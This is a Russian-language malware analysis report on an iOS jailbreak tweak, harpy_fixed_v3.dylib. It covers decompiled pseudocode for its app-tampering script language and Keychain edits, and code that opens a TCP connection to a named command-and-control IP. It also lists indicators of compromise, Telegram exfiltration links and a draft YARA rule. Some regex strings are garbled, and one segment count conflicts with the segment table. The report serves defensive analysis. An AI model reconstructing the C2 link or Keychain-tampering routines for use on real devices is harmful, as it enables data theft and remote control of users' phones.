# 🔬 Полный реверс-инжиниринг harpy_fixed_v3.dylib

## Оглавление
- [Общая информация](#-общая-информация)
- [Архитектура бинарника](#-архитектура-бинарника)
- [Карта памяти (Сегменты)](#-карта-памяти-сегменты)
- [Архитектура приложения](#-архитектура-приложения)
- [Точка входа](#-точка-входа-entry-point)
- [Harpy DSL — Скриптовый язык](#-harpy-dsl--скриптовый-язык)
- [Парсер скриптов (sub_42B54)](#-парсер-скриптов-sub_42b54)
- [Сетевая активность (C2)](#-сетевая-активность-c2)
- [UI структура (SwiftUI)](#-ui-структура-swiftui)
- [Функциональная карта](#-полная-функциональная-карта)
- [Импорты и зависимости](#-импорты-и-зависимости)
- [Строки и константы](#-ключевые-строки-и-константы)
- [Индикаторы компрометации (IoC)](#-индикаторы-компрометации-ioc)

---

## 📋 Общая информация

| Параметр | Значение |
|----------|----------|
| **Тип файла** | iOS Dynamic Library (.dylib) |
| **Архитектура** | ARM64e (Apple iOS jailbreak tweak) |
| **Размер** | 441,336 байт (0x6BBF8) |
| **MD5** | `d0701a2f9fb3e92853472d0298bd4415` |
| **SHA256** | Требуется вычисление |
| **Путь установки** | `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` |
| **Язык** | Swift 5 + Objective-C interop |
| **Min iOS Version** | iOS 14.0+ (предположительно) |
| **Фреймворки** | SwiftUI, Combine, CoreData, Security, Network, CydiaSubstrate |

---

## 🏛️ Архитектура бинарника

### Карта памяти (Сегменты)

| Сегмент | Начало | Конец | Размер | Права | Назначение |
|---------|--------|-------|--------|-------|------------|
| `__TEXT` | 0x0 | 0x5C000 | 376KB | R-X | Исполняемый код |
| `__DATA_CONST` | 0x5C000 | 0x60000 | 16KB | R-- | Константные данные |
| `__DATA` | 0x60000 | 0x68000 | 32KB | RW- | Изменяемые данные |
| `__LINKEDIT` | 0x68000 | 0x6C000 | 16KB | R-- | Информация для линкера |

### Статистика функций

| Метрика | Значение |
|---------|----------|
| **Всего функций** | ~920 |
| **Swift функций** | ~800 |
| **ObjC методов** | ~50 |
| **Thunk/Bridge** | ~70 |
| **Строк** | ~500+ |
| **Структур** | ~50 |
| **Local types** | ~90 |

---

## 🏗️ Архитектура приложения

**Harpy** — iOS jailbreak-твик с SwiftUI интерфейсом для выполнения скриптов модификации приложений.

### Классовая иерархия

```
┌─────────────────────────────────────────────────────────────────┐
│                        CydiaSubstrate                          │
│                    (MobileSubstrate hook)                       │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                      SwiftUIWrapper                             │
│  +startMonitoring → dispatch_after(2sec) → presentContentView  │
└──────────────────────────┬──────────────────────────────────────┘
                           │
           ┌───────────────┼───────────────┐
           ▼               ▼               ▼
    ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
    │  AppState   │ │  UserData   │ │HarpyLogger  │
    │  (Singleton)│ │(Environment)│ │   (C2)      │
    └──────┬──────┘ └──────┬──────┘ └──────┬──────┘
           │               │               │
           └───────────────┼───────────────┘
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                        HarpyView                                │
│              (Main UI - sub_363B8, ~983 lines)                  │
│  ┌─────────┐ ┌──────────┐ ┌───────────┐ ┌─────────────────┐    │
│  │  Start  │ │ Settings │ │  Scripts  │ │    Logger       │    │
│  │ Button  │ │   View   │ │   View    │ │     View        │    │
│  └────┬────┘ └────┬─────┘ └─────┬─────┘ └────────┬────────┘    │
│       │           │             │                │              │
└───────┼───────────┼─────────────┼────────────────┼──────────────┘
        │           │             │                │
        ▼           ▼             ▼                ▼
   ┌──────────────────────────────────────────────────────────┐
   │               HarpyScript Parser (sub_42B54)             │
   │                     (~1883 lines)                        │
   │   .harpy.* commands → NSRegularExpression → Execute      │
   └──────────────────────────────────────────────────────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                ▼
        ┌──────────┐    ┌──────────┐     ┌──────────┐
        │UserDefaults│   │ Keychain │     │ CoreData │
        │  Manager   │   │ Manager  │     │ Manager  │
        └──────────┘    └──────────┘     └──────────┘
```

### Основные классы и адреса

| Класс | Адрес метаданных | Описание |
|-------|------------------|----------|
| `AppState` | 0xB77C | Singleton состояния (swift_once) |
| `SwiftUIWrapper` | - | ObjC wrapper для SwiftUI |
| `UserData` | 0x68B78 | EnvironmentObject пользователя |
| `HarpyScript` | 0x696E8 | Скриптовый движок |
| `HarpyLogger` | 0x69700 | Логирование в C2/Telegram |
| `HarpyBuy` | 0x696F8 | Экран покупки |
| `Scripting` | 0x696E0 | Редактор скриптов |
| `GeneralView` | 0x69708 | Общие настройки |
| `ContentView` | - | Корневой View |

---

## 🚀 Точка входа (Entry Point)

### sub_4000 — Dylib Initialization

```c
// Адрес: 0x4000
void __fastcall sub_4000() {
    // Получение singleton AppState
    // Вызов +[SwiftUIWrapper startMonitoring]
    objc_msgSend(SwiftUIWrapper, "startMonitoring");
    
    // Планирование задачи через 2 секунды
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC),
                   dispatch_get_main_queue(),
                   ^{
                       // Block в stru_64E70
                       // Показ UI
                   });
}
```

### sub_3BEE0 — Start Monitoring Handler

```c
// Адрес: 0x3BEE0
// Вызывается при нажатии кнопки "Start"
void sub_3BEE0() {
    // Установка флага isStartPressed = 1
    AppState.isStartPressed = 1;  // OBJC_IVAR____TtC5harpy8AppState_isStartPressed
    
    // Инициализация C2 соединения
    sub_2D99C(0);  // DispatchQueue accessor
    
    // Async задача через 2 секунды
    DispatchTime now = DispatchTime.now();
    DispatchTime delay = now + 2.0;
    OS_dispatch_queue.asyncAfter(delay, block);
}
```

---

## 🔧 Harpy DSL — Скриптовый язык

### Полный список команд

#### 📁 UserDefaults операции

| Команда | Адрес строки | Описание |
|---------|--------------|----------|
| `.harpy.edit.userdefaults` | 0x50990 | Редактирование ключа |
| `.harpy.remove.userdefaults` | 0x509b0 | Удаление ключа |
| `.harpy.clear.userdefaults` | 0x509d0 | Полная очистка |
| `.harpy.read.userdefaults` | 0x509f0 | Чтение всех данных |

Пример реализации (sub_42B54):
```c
// Установка значения в UserDefaults
v50 = objc_msgSend(objc_opt_self(&OBJC_CLASS___NSUserDefaults), "standardUserDefaults");
v51 = String._bridgeToObjectiveC()(key);
v52 = String._bridgeToObjectiveC()(value);
objc_msgSend(v50, "setObject:forKey:", v51, v52);
```

#### 🔐 Keychain операции

| Команда | Адрес строки | Regex паттерн |
|---------|--------------|---------------|
| `.harpy.edit.keychain` | 0x50a10 | `\.harpy\.edit\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$` |
| `.harpy.remove.keychain` | 0x50a30 | `\.harpy\.remove\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$` |
| `.harpy.read.keychain` | 0x50a50 | - |

Реализация удаления из Keychain (sub_46C94):
```c
// Формирование query для SecItemDelete
NSDictionary *query = @{
    (id)kSecClass: (id)kSecClassGenericPassword,
    (id)kSecAttrAccount: accountName
};
SecItemDelete((CFDictionaryRef)query);
// Вывод: "Keychain ключ удален: %@"
```

#### 💾 CoreData операции

| Команда | Адрес строки | Описание |
|---------|--------------|----------|
| `.harpy.update.coredata` | 0x50a70 | Модификация записей |
| `.harpy.read.app` | - | Чтение данных приложения |

Реализация (sub_47130):
```c
// Использует NSPredicate для фильтрации
NSPredicate *predicate = [NSPredicate predicateWithFormat:format];
NSFetchRequest *request = [[NSFetchRequest alloc] init];
[request setPredicate:predicate];
```

#### 🖨️ Системные команды

| Команда | Адрес строки | Regex паттерн |
|---------|--------------|---------------|
| `.harpy.print(message:` | 0x50ad0 | Вывод в лог |
| `.harpy.execute(script:` | 0x50af0 | Рекурсивное выполнение |
| `.harpy.write.file` | 0x50ab0 | Запись в файл |
| `.harpy.update.server` | 0x50a90 | Обновление с сервера |
| `.harpy(sleep:` | - | Пауза (regex: `sleep:(\+\d\))`) |
| `harpy(start)` | - | Маркер начала скрипта |
| `.modifyrestart` | - | Флаг перезапуска |

---

## ⚙️ Парсер скриптов (sub_42B54)

### Общая структура (~1883 строки)

```c
void __fastcall sub_42B54(__int64 script_data, __int64 script_bridge) {
    // 1. Получение метаданных HarpyScript
    v6 = type_metadata_accessor_for_HarpyScript(0);
    
    // 2. Инициализация итератора
    v10 = (*(_QWORD *)(v9 + 16));  // Количество строк
    
    // 3. Главный цикл обработки команд
    while (v10 > 0) {
        // Получение текущей подстроки
        v17 = *(v15 - 1);
        v20 = *v15;
        
        // Проверка "harpy(start)"
        strcpy(v464, "harpy(start)");
        if (StringProtocol.contains(v464)) {
            // Установка State.wrappedValue = 1
            State.wrappedValue.setter(v464, outputState);
        }
        
        // Проверка ".modifyrestart"
        strcpy(v464, ".modifyrestart");
        if (StringProtocol.contains(v464)) {
            // Включение флага перезапуска
        }
        
        // Проверка ".harpy.edit.userdefaults"
        v464[0] = 0xD000000000000018LL;  // Длина строки
        v464[1] = v441;  // Указатель на строку
        if (StringProtocol.contains(v464)) {
            // Парсинг параметров через sub_48464
            result = sub_48464(script, pattern, value);
            // NSUserDefaults.setObject:forKey:
        }
        
        // Проверка ".harpy.remove.userdefaults" (regex)
        v68 = objc_allocWithZone(&OBJC_CLASS___NSRegularExpression);
        v70 = sub_4AA48(pattern, 0);  // Создание regex
        // NSRegularExpression.firstMatchInString:options:range:
        // Извлечение capture group 1
        
        // Проверка ".harpy(sleep:"
        strcpy(v464, ".harpy(sleep:");
        if (StringProtocol.contains(v464)) {
            // Regex: sleep:(\+\d\)
            // Извлечение значения задержки
            // Парсинг числа
        }
        
        // Переход к следующей строке
        v15 = v16 + 4;
        --v10;
    }
    
    // 4. Финализация
    sub_49528(script_data, script_bridge);  // Сохранение конфигурации
}
```

### Regex паттерны (sub_4AA48)

```c
// Создание NSRegularExpression
id sub_4AA48(__int64 pattern_swift, __int64 pattern_bridge, __int64 options) {
    NSString *pattern = String._bridgeToObjectiveC()(pattern_swift, pattern_bridge);
    NSError *error = nil;
    NSRegularExpression *regex = [[NSRegularExpression alloc] 
        initWithPattern:pattern 
        options:options 
        error:&error];
    return regex;
}
```

### Парсинг параметров (sub_48464)

```c
__int64 sub_48464(__int64 script, __int64 key_pattern, __int64 value_pattern) {
    // Поиск ключа в скрипте
    for (int i = 0; i < count; i++) {
        if (StringProtocol.contains(substring, key_pattern)) {
            // Извлечение значения
            // Trim whitespace
            static CharacterSet.whitespacesAndNewlines.getter();
            result = StringProtocol.trimmingCharacters(in:);
            
            // Удаление кавычек
            CharacterSet.init(charactersIn:)("\"");
            return StringProtocol.trimmingCharacters(in:);
        }
    }
    return 0;
}
```

---

## 🌐 Сетевая активность (C2)

### ⚠️ Command & Control Server

| Параметр | Значение |
|----------|----------|
| **IP-адрес** | `92.246.138.114` |
| **Порт** | `4001` |
| **Протокол** | TCP (Network.framework) |
| **API** | NWConnection |

### Реализация C2 соединения (sub_2A2EC)

```c
void sub_2A2EC() {
    // 1. Создание endpoint
    NWEndpoint.Host host = NWEndpoint.Host.init(stringLiteral:)("92.246.138.114");
    NWEndpoint.Port port = NWEndpoint.Port.init(integerLiteral:)(4001);
    
    // 2. Получение TCP параметров
    NWParameters *params = NWParameters.tcp.getter();
    
    // 3. Создание соединения
    NWConnection *connection = NWConnection.__allocating_init(host:port:using:)(
        host, port, params);
    
    // 4. Установка обработчика состояния
    NWConnection.stateUpdateHandler.setter(connection, ^(NWConnectionState state) {
        // Обработка изменений состояния
    });
    
    // 5. Запуск соединения
    DispatchQueue *queue = DispatchQueue.init(
        label: "harpy.network",
        qos: DispatchQoS.QoSClass.default
    );
    NWConnection.start(queue:)(connection, queue);
}
```

### HarpyLogger — Телеметрия

Адрес type metadata: `0x69700`

```c
// Отправка логов через Telegram Bot API
// Bot: @harpyapp_bot (https://t.me/harpyapp_bot)

struct HarpyLogger {
    String telegramBotToken;
    String chatId;
    Bool isEnabled;
    NWConnection *c2Connection;
};
```

### Внешние URL

| URL | Назначение | Адрес строки |
|-----|------------|--------------|
| `https://i.ibb.co/SKYxFp1/logos.png` | Логотип приложения | 0x50700 |
| `https://t.me/harpysupport` | Поддержка | 0x506xx |
| `https://t.me/harpyapp_bot` | Telegram бот | 0x506xx |
| `https://t.me/harpyapp` | Канал Harpy | 0x506xx |
| `https://t.me/lurizevl` | Разработчик | 0x506xx |
| `https://t.me/imharpy` | Профиль | 0x506xx |

---

## 📱 UI структура (SwiftUI)

### HarpyView.body (sub_363B8) — ~983 строки

```swift
var body: some View {
    ZStack {
        // Фон
        Color.init(red: 0.945, green: 0.945, blue: 0.945, opacity: 1.0)
        
        VStack {
            // Логотип
            AsyncImage(url: URL(string: "https://i.ibb.co/SKYxFp1/logos.png"))
                .resizable()
                .padding(.horizontal, 25)
                .padding(.top, 10)
            
            // Кнопка Start
            Button(action: { sub_38344() }, label: { sub_3859C() })
                .padding(EdgeInsets(top: 10, leading: 25, bottom: 10, trailing: 25))
            
            // Список навигации
            NavigationLink(destination: GeneralView()) { /* ... */ }
            NavigationLink(destination: HarpyLogger()) { /* ... */ }
            NavigationLink(destination: HarpyBuy()) { /* ... */ }
            NavigationLink(destination: HarpyScript()) { /* ... */ }
            NavigationLink(destination: Scripting()) { /* ... */ }
        }
    }
    .cornerRadius(20, style: .continuous)
}
```

### Кнопка Start (sub_4546C)

```swift
// sub_4546C - Start Button View
Button {
    // Action: sub_3BEE0 (Start monitoring)
} label: {
    Text("Start")
        .font(.title2.rounded.semibold)
        .foregroundColor(.white)
        .frame(height: 70)
        .background(
            RoundedRectangle(cornerRadius: 20)
                .fill(Color.black)
        )
        .padding(.horizontal, 25)
}
```

### UI Components Mapping

| Функция | Описание | SwiftUI компонент |
|---------|----------|-------------------|
| sub_363B8 | HarpyView.body | ZStack, VStack, Image |
| sub_43F0 | ContentView.body | ConditionalContent |
| sub_5198 | VStack builder | VStack with spacing |
| sub_3C768 | Rounded rectangle | RoundedRectangle, StrokeStyle |
| sub_4546C | Start button | Button, Text, Font |
| sub_3D4F4 | NavigationView | NavigationView, sheet |
| sub_2FA88 | HarpySettings | Image from URL, EdgeInsets |

---

## 🗺️ Полная функциональная карта

### Инициализация и Lifecycle

| Адрес | Функция | Сигнатура | Описание |
|-------|---------|-----------|----------|
| 0x4000 | Entry Point | `void sub_4000()` | Инициализация dylib |
| 0xB77C | AppState.shared | `+[AppState shared]` | Singleton accessor |
| 0x105F0 | Present UI | `+[SwiftUIWrapper presentContentView]` | Показ UI через 1с |
| 0xC774 | Dismiss UI | `+[SwiftUIWrapper dismissContentView]` | Закрытие UI |
| 0x3BEE0 | Start Handler | `void sub_3BEE0()` | Обработчик Start |
| 0x2D99C | Queue Accessor | `void sub_2D99C()` | DispatchQueue init |

### Парсер скриптов

| Адрес | Функция | Размер | Описание |
|-------|---------|--------|----------|
| 0x42B54 | Script Parser | ~1883 строк | Главный парсер DSL |
| 0x48464 | Param Parser | ~300 строк | Извлечение параметров |
| 0x490C8 | Script Loader | ~100 строк | Загрузка из файла |
| 0x49528 | Script Saver | ~200 строк | Сохранение конфига |
| 0x4AA48 | Regex Factory | ~50 строк | Создание NSRegularExpression |

### UserDefaults операции

| Адрес | Функция | Операция |
|-------|---------|----------|
| 0x46654 | Read UD | Чтение dictionaryRepresentation |
| 0x432C8 | Set UD | setObject:forKey: |
| 0x44734 | Remove UD | removeObjectForKey: |
| 0x43290 | Edit UD | Парсинг + установка |

### Keychain операции

| Адрес | Функция | Операция |
|-------|---------|----------|
| 0x46C94 | Remove Key | SecItemDelete |
| 0x44680 | Read Key | SecItemCopyMatching |
| 0x440C4 | Edit Key | SecItemUpdate |

### CoreData операции

| Адрес | Функция | Операция |
|-------|---------|----------|
| 0x47130 | Update CD | NSPredicate + NSFetchRequest |
| 0x48C0C | Read App | Чтение директории |

### Сетевые функции

| Адрес | Функция | Описание |
|-------|---------|----------|
| 0x2A2EC | C2 Connect | TCP 92.246.138.114:4001 |
| 0x2D8BC | Send Log | Отправка через HarpyLogger |
| 0xD8E0 | URL Load | NSData initWithContentsOfURL |

### UI функции

| Адрес | Функция | View |
|-------|---------|------|
| 0x363B8 | HarpyView.body | Главный экран |
| 0x43F0 | ContentView.body | Root view |
| 0x2FA88 | HarpySettings | Настройки |
| 0x3D4F4 | NavigationView | Навигация |
| 0x45AA4 | File List | Список .txt файлов |

### Вспомогательные

| Адрес | Функция | Описание |
|-------|---------|----------|
| 0x4BBB8 | State Release | Освобождение State |
| 0x4BA88 | State Access | Доступ к State |
| 0xCF20 | Metadata Get | Type metadata accessor |
| 0xCF64 | Conformance | Protocol conformance |

---

## 📦 Импорты и зависимости

### Swift Runtime

| Символ | Назначение |
|--------|------------|
| `swift_allocObject` | Аллокация объектов |
| `swift_release` / `swift_retain` | ARC управление |
| `swift_bridgeObjectRetain` | Bridge object retain |
| `swift_getObjCClassMetadata` | ObjC interop |
| `swift_getOpaqueTypeConformance` | Protocol conformance |
| `swift_once` | Thread-safe initialization |
| `swift_unexpectedError` | Error handling |

### Foundation

| Символ | Назначение |
|--------|------------|
| `NSUserDefaults` | Хранение настроек |
| `NSFileManager` | Работа с файлами |
| `NSRegularExpression` | Парсинг regex |
| `NSPredicate` | CoreData запросы |
| `NSData` | Бинарные данные |

### Security.framework

| Символ | Назначение |
|--------|------------|
| `SecItemDelete` | Удаление из Keychain |
| `SecItemCopyMatching` | Чтение Keychain |
| `SecItemUpdate` | Обновление Keychain |

### Network.framework

| Символ | Назначение |
|--------|------------|
| `NWConnection` | TCP соединение |
| `NWEndpoint` | Endpoint (host:port) |
| `NWParameters` | Параметры соединения |

### SwiftUI

| Символ | Назначение |
|--------|------------|
| `State.wrappedValue` | Property wrapper |
| `EnvironmentObject` | DI контейнер |
| `NavigationView` | Навигация |
| `Button` | Кнопки |
| `Image` | Изображения |

---

## 📝 Ключевые строки и константы

### DSL команды

```
.harpy.edit.userdefaults      (0x50990)
.harpy.remove.userdefaults    (0x509b0)
.harpy.clear.userdefaults     (0x509d0)
.harpy.read.userdefaults      (0x509f0)
.harpy.edit.keychain          (0x50a10)
.harpy.remove.keychain        (0x50a30)
.harpy.read.keychain          (0x50a50)
.harpy.update.coredata        (0x50a70)
.harpy.update.server          (0x50a90)
.harpy.write.file             (0x50ab0)
.harpy.print(message:         (0x50ad0)
.harpy.execute(script:        (0x50af0)
```

### Regex паттерны

```
\.harpy\.remove\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$  (0x50bc0)
sleep:(\+\d\)                 (парсинг задержки)
```

### Сообщения

```
"Keychain ключ удален: "      (0x50c10)
"Keychain обновлен: "         (0x50c40)
"Нет записей в Keychain"      (0x50d40)
"Выполняется повтор..."       (0x50513)
"For Developers"              (текст секции)
"HarpyTeam"                   (подпись)
```

### URLs

```
https://i.ibb.co/SKYxFp1/logos.png     (0x50700)
https://t.me/harpyapp_bot
https://t.me/harpysupport
https://t.me/harpyapp
https://t.me/lurizevl
https://t.me/imharpy
```

### Файлы

```
harpyconfig.txt               (файл конфигурации)
harpy.dylib                   (путь установки)
.txt                          (фильтр скриптов)
```

---

## 🚨 Индикаторы компрометации (IoC)

### Network IoC

| Тип | Значение | Описание |
|-----|----------|----------|
| IP | `92.246.138.114` | C2 сервер |
| Port | `4001/tcp` | C2 порт |
| Domain | `t.me/harpyapp_bot` | Telegram exfiltration |
| URL | `i.ibb.co/SKYxFp1/logos.png` | Payload indicator |

### File IoC

| Путь | Описание |
|------|----------|
| `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` | Основной модуль |
| `Documents/harpyconfig.txt` | Файл конфигурации |
| `*.txt` в Documents | Скрипты Harpy |

### Behavioral IoC

- Обращение к `NSUserDefaults.standardUserDefaults`
- Вызовы `SecItemDelete`, `SecItemUpdate`
- TCP соединение на порт 4001
- Загрузка изображений с `ibb.co`
- Regex парсинг с паттернами `.harpy.*`

### YARA Rule (Draft)

```yara
rule Harpy_iOS_Tweak {
    meta:
        description = "Harpy iOS jailbreak tweak"
        author = "Reverse Engineer"
        
    strings:
        $c2_ip = "92.246.138.114"
        $c2_port = { 01 10 00 00 }  // 4001 little-endian
        $cmd1 = ".harpy.edit.userdefaults"
        $cmd2 = ".harpy.remove.keychain"
        $cmd3 = ".harpy.update.coredata"
        $telegram = "harpyapp_bot"
        $logo_url = "i.ibb.co/SKYxFp1"
        
    condition:
        (uint32(0) == 0xFEEDFACF) and  // Mach-O 64-bit
        ($c2_ip or $telegram) and
        2 of ($cmd*)
}
```

---

## 📊 Заключение

**Harpy** представляет собой сложный iOS jailbreak-твик с:

1. **Полноценным скриптовым DSL** для модификации приложений
2. **C2 инфраструктурой** для удалённого управления
3. **Телеметрией через Telegram** для сбора данных
4. **SwiftUI интерфейсом** для удобного управления

### Уровень угрозы: 🔴 ВЫСОКИЙ

- Прямой доступ к Keychain
- Модификация UserDefaults любого приложения  
- Возможность удалённого управления
- Экфильтрация данных через Telegram

---

*Отчёт создан в результате полного реверс-инжиниринга с использованием IDA Pro + MCP*

### ⚠️ Потенциальные риски

1. **Data exfiltration** — Данные отправляются на C2-сервер (92.246.138.114:4001) и Telegram
2. **Keychain manipulation** — Прямой доступ к Keychain через Security.framework
3. **Persistence** — Сохранение конфигурации в файловую систему
4. **No encryption** — Скрипты хранятся в открытом виде
5. **Remote command execution** — Возможность выполнения удалённых скриптов
6. **UserDefaults tampering** — Модификация настроек любого приложения

---

### 🛡️ Indicators of Compromise (IOC)

#### Сетевые индикаторы:
| Тип | Значение |
|-----|----------|
| **IP** | `92.246.138.114` |
| **Port** | `4001/tcp` |
| **Domain** | `t.me/harpyapp_bot` |

#### Файловые индикаторы:
| Путь | Описание |
|------|----------|
| `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` | Основной бинарник |
| `Documents/harpyconfig.txt` | Конфигурация скриптов |

#### Строки:
```
"Data logging in telegram bot"
".harpy.edit.userdefaults"
".harpy.remove.keychain"
"harpyapp_bot"
"Keychain ключ удален"
```

---

### 📊 Статистика

- **Функций**: ~900+
- **Импортов**: 300+ (Foundation, UIKit, SwiftUI, Security, CoreData, Network)
- **Строк**: 500+ (включая Swift metadata)
- **Сегментов**: 35 (стандартная Mach-O структура)

---

### 📦 Используемые Frameworks

| Framework | Назначение |
|-----------|------------|
| **Foundation** | NSUserDefaults, NSFileManager, NSData, JSONDecoder |
| **UIKit** | UIImage, UIWindow |
| **SwiftUI** | Полный UI (Button, Text, NavigationLink, State, Binding) |
| **Security** | SecItemCopyMatching, SecItemDelete, SecItemUpdate (Keychain) |
| **CoreData** | NSManagedObjectContext, NSPredicate, NSFetchRequest |
| **Network** | NWConnection, NWEndpoint (TCP к C2-серверу) |
| **Combine** | Published, ObservableObject, StateObject |
| **CydiaSubstrate** | MSHookMessageEx, MSHookFunction (runtime hooking) |

---

### 🔬 Методология анализа

1. **IDA Pro 8.x** — статический анализ ARM64e Mach-O
2. **Hex-Rays Decompiler** — декомпиляция в псевдокод Swift/ObjC
3. **Swift Demangler** — разбор Swift symbol names
4. **Строковой анализ** — поиск URL, IP, путей, команд
5. **Cross-reference анализ** — построение call graph

---

### 📝 Заключение

**harpy_fixed_v3.dylib** — это продвинутый iOS jailbreak tweak с:
- Полноценным C2-каналом для удалённого управления
- Telegram-ботом для эксфильтрации данных  
- Собственным DSL для автоматизации атак
- Доступом к чувствительным хранилищам (Keychain, CoreData)

Представляет серьёзную угрозу для приватности и безопасности пользователей jailbroken устройств.

---

*Анализ выполнен: Декабрь 2025*